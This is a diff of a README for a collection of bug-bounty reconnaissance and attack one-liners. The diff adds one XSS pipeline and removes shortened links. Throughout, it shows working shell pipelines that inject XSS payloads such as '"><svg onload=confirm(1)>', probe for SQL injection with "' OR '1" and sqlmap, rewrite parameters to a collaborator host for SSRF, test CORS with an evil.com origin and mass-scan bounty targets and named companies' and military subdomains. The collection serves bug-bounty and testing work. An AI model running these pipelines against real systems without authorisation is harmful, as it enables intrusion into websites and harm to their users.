@@ -92,6 +92,7 @@ To run the project, you will need to install the following programs:
 - [SubJS](https://github.com/lc/subjs)
 - [Unew](https://github.com/dwisiswant0/unew)
 - [Unfurl](https://github.com/tomnomnom/unfurl)
+- [Urldedupe](https://github.com/ameenmaali/urldedupe)
 - [WaybackURLs](https://github.com/tomnomnom/waybackurls)
 - [Wingman](https://xsswingman.com/#faq)
 - [Goop](https://github.com/deletescape/goop)
@@ -121,22 +122,29 @@ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 
 ```
 
+###  urldedupe bhedak
+- [Explained command]
+```bash
+waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+
+
 ###  Airixss XSS 
-- [Explained command](https://bit.ly/3tq5Hfv)
+- [Explained command]
 ```bash
 echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 ```
 
 
 ###  FREQ XSS 
-- [Explained command](https://bit.ly/3u8Qpeu)
+- [Explained command]
 ```bash
 echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
 ```
 
 
 ###  Bhedak
-- [Explained command](https://bit.ly/3oNisxi)
+- [Explained command]
 ```bash
 cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
 ```
@@ -164,41 +172,41 @@ cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt;
 ```
 
 ###  Running JavaScript on each page send to proxy. 
-- [Explained command](https://bit.ly/3daIyFw)
+- [Explained command]
 
 ```bash
 cat 200http | page-fetch --javascript '[...document.querySelectorAll("a")].map(n => n.href)' --proxy http://192.168.15.47:8080
 ```
 
 ###  Running cariddi to Crawler
-- [Explained command](https://bit.ly/3hQPF8w)
+- [Explained command]
 
 ```bash
 echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
 ```
 
 ###  Dalfox scan to bugbounty targets.
-- [Explained command](https://bit.ly/3nnEhCj)
+- [Explained command]
 
 ```bash
 xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer'
 ```
 
 ### Dalfox scan to bugbounty targets.
-- [Explained command](https://bit.ly/324Sr1x)
+- [Explained command]
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
 ```
 
 ### Using x8 to Hidden parameters discovery
-- [Explaining command](https://bit.ly/3w48wl8)
+- [Explaining command]
 
 ```bash
 assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
 ```
 
 ### Extract .js Subdomains
-- [Explaining command](https://bit.ly/339CN5p)
+- [Explaining command]
 
 ```bash
 echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
@@ -207,7 +215,7 @@ echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson
 
 
 ### goop to search .git files.
-- [Explaining command](https://bit.ly/3d0VcY5)
+- [Explaining command]
 
 ```bash
 xargs -a xss -P10 -I@ sh -c 'goop @'
@@ -221,7 +229,7 @@ curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-prog
 
 ### Using Wingman to search XSS reflect / DOM XSS
 
-- [Explaining command](https://bit.ly/3m5ft1g)
+- [Explaining command]
 
 ```bash
 xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'
@@ -230,7 +238,7 @@ xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'
 
 ### Search ASN to metabigor and resolvers domain
 
-- [Explaining command](https://bit.ly/3bvghsY)
+- [Explaining command]
 
 ```bash
 echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
@@ -241,7 +249,7 @@ echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' 
 
 ### Search .json gospider filter anti-burl
 
-- [Explaining command](https://bit.ly/3eoUhSb)
+- [Explaining command]
 
 ```bash
 gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | anti-burl
@@ -250,7 +258,7 @@ gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}'
 
 ### Search .json subdomain
 
-- [Explaining command](https://bit.ly/3kZydis)
+- [Explaining command]
 
 ```bash
 assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
@@ -258,7 +266,7 @@ assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew
 
 ### SonarDNS extract subdomains
 
-- [Explaining command](https://bit.ly/2NvXRyv)
+- [Explaining command]
 
 ```bash
 wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
@@ -266,7 +274,7 @@ wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json
 
 ### Kxss to search param XSS 
 
-- [Explaining command](https://bit.ly/3aaEDHL)
+- [Explaining command]
 
 ```bash
 echo http://testphp.vulnweb.com/ | waybackurls | kxss
@@ -275,7 +283,7 @@ echo http://testphp.vulnweb.com/ | waybackurls | kxss
 
 ### Recon subdomains and gau to search vuls DalFox
 
-- [Explaining command](https://bit.ly/3aMXQOF)
+- [Explaining command]
 
 ```bash
 assetfinder testphp.vulnweb.com | gau |  dalfox pipe
@@ -284,7 +292,7 @@ assetfinder testphp.vulnweb.com | gau |  dalfox pipe
 
 ### Recon subdomains and Screenshot to URL using gowitness
 
-- [Explaining command](https://bit.ly/3aKSSCb)
+- [Explaining command]
 
 ```bash
 assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
@@ -293,7 +301,7 @@ assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'g
 
 ###  Extract urls to source code comments
 
-- [Explaining command](https://bit.ly/2MKkOxm)
+- [Explaining command]
 
 ```bash
 cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' 
@@ -301,7 +309,7 @@ cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=
 
 ###  Axiom recon "complete"
 
-- [Explaining command](https://bit.ly/2NIavul)
+- [Explaining command]
 
 ```bash
 findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u 
@@ -309,7 +317,7 @@ findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 
 
 ###  Domain subdomain extraction 
 
-- [Explaining command](https://bit.ly/3c2t6eG)
+- [Explaining command]
 
 ```bash
 cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'
@@ -319,7 +327,7 @@ cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'a
 
 ###  Search .js using 
 
-- [Explaining command](https://bit.ly/362LyQF)
+- [Explaining command]
 
 ```bash
 assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
@@ -328,7 +336,7 @@ assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-r
 
 ###  This one was huge ... But it collects .js gau + wayback + gospider and makes an analysis of the js. tools you need below.
 
-- [Explaining command](https://bit.ly/3sD0pLv)
+- [Explaining command]
 
 ```bash
 cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
@@ -337,7 +345,7 @@ cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; ca
 
 ###  My recon automation simple. OFJAAAH.sh
 
-- [Explaining command](https://bit.ly/3nWHM22)
+- [Explaining command]
 
 ```bash
 chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subfinder -d $1 -o subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 >> hosts ; cat hosts | anew clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 subfinder1
@@ -345,7 +353,7 @@ chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subf
 
 ###  Download all domains to bounty chaos
 
-- [Explaining command](https://bit.ly/38wPQ4o)
+- [Explaining command]
 
 ```bash
 curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
@@ -353,7 +361,7 @@ curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh
 
 ###  Recon to search SSRF Test
 
-- [Explaining command](https://bit.ly/3shFFJ5)
+- [Explaining command]
 
 ```bash
 findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
@@ -362,7 +370,7 @@ findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsrepla
 
 ###  ShuffleDNS to domains in file scan nuclei.
 
-- [Explaining command](https://bit.ly/2L3YVsc)
+- [Explaining command]
 
 ```bash
 xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
@@ -371,7 +379,7 @@ xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resol
 
 ###  Search Asn Amass
 
-- [Explaining command](https://bit.ly/2EMooDB)
+- [Explaining command]
 
 Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me)
 
@@ -381,7 +389,7 @@ amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | s
 
 ###  SQLINJECTION Mass domain file
 
-- [Explaining command](https://bit.ly/354lYuf)
+- [Explaining command]
 
 ```bash
 
@@ -392,7 +400,7 @@ httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | ht
 ###  Using chaos search js
 
 
-- [Explaining command](https://bit.ly/32vfRg7)
+- [Explaining command]
 
 Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".
 
@@ -403,7 +411,7 @@ chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2
 ###  Search Subdomain using Gospider
 
 
-- [Explaining command](https://bit.ly/2QtG9do)
+- [Explaining command]
 
 GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS
 
@@ -414,7 +422,7 @@ gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,cs
 ###  Using gospider to chaos
 
 
-- [Explaining command](https://bit.ly/2D4vW3W)
+- [Explaining command]
 
 GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.
 
@@ -425,7 +433,7 @@ chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospi
 
 ###  Using recon.dev and gospider crawler subdomains
 
-- [Explaining command](https://bit.ly/32pPRDa)
+- [Explaining command]
 
 We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, replacing with a Stream EDitor all blank spaces
 If anew, we can sort and display unique domains on screen, redirecting this output list to httpx to create a new list with just alive domains.
@@ -437,7 +445,7 @@ curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].raw
 
 ###  PSQL - search subdomain using cert.sh
 
-- [Explaining command](https://bit.ly/32rMA6e)
+- [Explaining command]
 
 Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text domains with anew to confirm unique outputs
 
@@ -447,7 +455,7 @@ psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null
 
 ###  Search subdomains using github and httpx
 
-- [Github-search](https://github.com/gwen001/github-search)
+- [Github-search]
 
 Using python3 to search subdomains, httpx filter hosts by up status-code response (200)
 
@@ -457,7 +465,7 @@ Using python3 to search subdomains, httpx filter hosts by up status-code respons
 
 ###  Search SQLINJECTION using qsreplace search syntax error
 
-- [Explained command](https://bit.ly/3hxFWS2)
+- [Explained command]
 
 ```bash
 grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
@@ -465,7 +473,7 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
 
 ###  Search subdomains using jldc
 
-- [Explained command](https://bit.ly/2YBlEjm)
+- [Explained command]
 
 ```bash
 curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
@@ -473,7 +481,7 @@ curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/
 
 ###  Search subdomains in assetfinder using hakrawler spider to search links in content responses
 
-- [Explained command](https://bit.ly/3hxRvZw)
+- [Explained command]
 
 ```bash
 assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
@@ -481,7 +489,7 @@ assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follo
 
 ###  Search subdomains in cert.sh
 
-- [Explained command](https://bit.ly/2QrvMXl)
+- [Explained command]
 
 ```bash
 curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
@@ -489,7 +497,7 @@ curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | s
 
 ###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD
 
-- [Explained command](https://bit.ly/3lhFcTH)
+- [Explained command]
 
 ```bash
 curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
@@ -499,7 +507,7 @@ curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_valu
 ```
 ###  Collect js files from hosts up by gospider
 
-- [Explained command](https://bit.ly/3aWIwyI)
+- [Explained command]
 
 ```bash
 xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
@@ -507,7 +515,7 @@ xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs
 
 ###  Subdomain search Bufferover resolving domain to httpx
 
-- [Explained command](https://bit.ly/3lno9j0)
+- [Explained command]
 
 ```bash
 curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
@@ -516,7 +524,7 @@ curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/
 ###  Using gargs to gospider search with parallel proccess
 - [Gargs](https://github.com/brentp/gargs)
 
-- [Explained command](https://bit.ly/2EHj1FD)
+- [Explained command]
 
 ```bash
 httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
@@ -524,7 +532,7 @@ httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 
 
 ###  Injection xss using qsreplace to urls filter to gospider
 
-- [Explained command](https://bit.ly/3joryw9)
+- [Explained command]
 
 ```bash
 gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
@@ -532,7 +540,7 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 
 ###  Extract URL's to apk
 
-- [Explained command](https://bit.ly/2QzXwJr)
+- [Explained command]
 
 ```bash
 apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
@@ -540,7 +548,7 @@ apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ |
 
 ###  Chaos to Gospider
 
-- [Explained command](https://bit.ly/3gFJbpB)
+- [Explained command]
 
 ```bash
 chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
@@ -557,7 +565,7 @@ xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" 
 
 ###  Using shodan & Nuclei
 
-- [Explained command](https://bit.ly/3jslKle)
+- [Explained command]
 
 Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
 httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.
@@ -568,7 +576,7 @@ shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /n
 
 ###  Open Redirect test using gf.
 
-- [Explained command](https://bit.ly/3hL263x)
+- [Explained command]
 
 echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.
 
@@ -578,14 +586,14 @@ echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirec
 
 ###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".
 
-- [Explained command](https://bit.ly/2QQfY0l)
+- [Explained command]
 
 ```bash
 shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
 ```
 ###  Using Chaos to jaeles "How did I find a critical today?.
 
-- [Explained command](https://bit.ly/2YXiK8N)
+- [Explained command]
 
 To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 
 
@@ -595,7 +603,7 @@ chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles
 
 ###  Using shodan to jaeles
 
-- [Explained command](https://bit.ly/2Dkmycu)
+- [Explained command]
 
 ```bash
 domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
@@ -603,7 +611,7 @@ domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1
 
 ###  Search to files using assetfinder and ffuf
 
-- [Explained command](https://bit.ly/2Go3Ba4)
+- [Explained command]
 
 ```bash
 assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
@@ -611,7 +619,7 @@ assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh 
 
 ###  HTTPX using new mode location and injection XSS using qsreplace.
 
-- [Explained command](https://bit.ly/2Go3Ba4)
+- [Explained command]
 
 ```bash
 httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
@@ -619,7 +627,7 @@ httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{pri
 
 ###  Grap internal juicy paths and do requests to them.
 
-- [Explained command](https://bit.ly/357b1IY)
+- [Explained command]
 
 ```bash
 export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
@@ -627,7 +635,7 @@ export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinde
 
 ###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.
 
-- [Explained command](https://bit.ly/2R2gNn5)
+- [Explained command]
 
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
@@ -635,7 +643,7 @@ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/
 
 ###  Using to findomain to SQLINJECTION.
 
-- [Explained command](https://bit.ly/2ZeAhcF)
+- [Explained command]
 
 ```bash
 findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
@@ -643,7 +651,7 @@ findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sq
 
 ###  Jaeles scan to bugbounty targets.
 
-- [Explained command](https://bit.ly/3jXbTnU)
+- [Explained command]
 
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
@@ -651,7 +659,7 @@ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/
 
 ###  JLDC domain search subdomain, using rush and jaeles.
 
-- [Explained command](https://bit.ly/3hfNV5k)
+- [Explained command]
 
 ```bash
 curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
@@ -659,14 +667,14 @@ curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\
 
 ###  Chaos to search subdomains check cloudflareip scan port.
 
-- [Explained command](https://bit.ly/3hfNV5k)
+- [Explained command]
 
 ```bash
 chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
 ```
 ###  Search JS to domains file.
 
-- [Explained command](https://bit.ly/2Zs13yj)
+- [Explained command]
 
 ```bash
 cat FILE TO TARGET | httpx -silent | subjs | anew
@@ -674,7 +682,7 @@ cat FILE TO TARGET | httpx -silent | subjs | anew
 
 ###  Search JS using assetfinder, rush and hakrawler.
 
-- [Explained command](https://bit.ly/3ioYuV0)
+- [Explained command]
 
 ```bash
 assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
@@ -682,7 +690,7 @@ assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --foll
 
 ###  Search to CORS using assetfinder and rush
 
-- [Explained command](https://bit.ly/33qT71x)
+- [Explained command]
 
 ```bash
 assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"'
@@ -690,7 +698,7 @@ assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j2
 
 ###  Search to js using hakrawler and rush & unew
 
-- [Explained command](https://bit.ly/2Rqn9gn)
+- [Explained command]
 
 ```bash
 cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
@@ -698,7 +706,7 @@ cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scop
 
 ###  XARGS to dirsearch brute force.
 
-- [Explained command](https://bit.ly/32MZfCa)
+- [Explained command]
 
 ```bash
 cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js' 
@@ -706,7 +714,7 @@ cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403
 
 ###  Assetfinder to run massdns.
 
-- [Explained command](https://bit.ly/32T5W5O)
+- [Explained command]
 
 ```bash
 assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
@@ -714,7 +722,7 @@ assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S
 
 ###  Extract path to js
 
-- [Explained command](https://bit.ly/3icrr5R)
+- [Explained command]
 
 ```bash
 cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u 
@@ -722,7 +730,7 @@ cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))
 
 ###  Find subdomains and Secrets with jsubfinder
 
-- [Explained command](https://bit.ly/3dvP6xq)
+- [Explained command]
 
 ```bash
 cat subdomsains.txt | httpx --silent | jsubfinder search -s
@@ -730,7 +738,7 @@ cat subdomsains.txt | httpx --silent | jsubfinder search -s
 
 ###  Search domains to Range-IPS.
 
-- [Explained command](https://bit.ly/3fa0eAO)
+- [Explained command]
 
 ```bash
 cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew 
@@ -738,7 +746,7 @@ cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' |
 
 ###  Search new's domains using dnsgen.
 
-- [Explained command](https://bit.ly/3kNTHNm)
+- [Explained command]
 
 ```bash
 xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain
@@ -746,14 +754,14 @@ xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | an
 
 ###  List ips, domain extract, using amass + wordlist
 
-- [Explained command](https://bit.ly/2JpRsmS)
+- [Explained command]
 
 ```bash
